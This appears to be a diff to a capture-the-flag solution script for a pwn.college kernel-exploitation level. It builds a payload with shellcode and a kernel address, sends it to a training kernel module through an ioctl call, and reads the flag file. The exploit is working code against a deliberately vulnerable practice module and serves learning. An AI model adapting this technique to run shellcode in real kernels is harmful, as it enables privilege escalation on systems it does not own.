@@ -1,5 +1,5 @@
 # Level 7
-import ctypes
+import fcntl
 import os
 
 import pwn
@@ -11,18 +11,16 @@ import pwn
 SHELLCODE_ADDR = 0xFFFFC90000085000
 
 sc = pwn.read("shellcode.bin")
-payload = ctypes.create_string_buffer(
-    pwn.flat(
-        {
-            0x0000: len(sc),
-            0x0008: sc,
-            0x1008: SHELLCODE_ADDR,
-        }
-    )
+payload = pwn.flat(
+    {
+        0x0000: len(sc),
+        0x0008: sc,
+        0x1008: SHELLCODE_ADDR,
+    }
 )
 
 fd = os.open("/proc/pwncollege", os.O_RDWR)
-ctypes.CDLL(None).ioctl(fd, 1337, ctypes.byref(payload))
+fcntl.ioctl(fd, 1337, bytearray(payload))
 os.close(fd)
 
 print(pwn.read("/flag").decode())
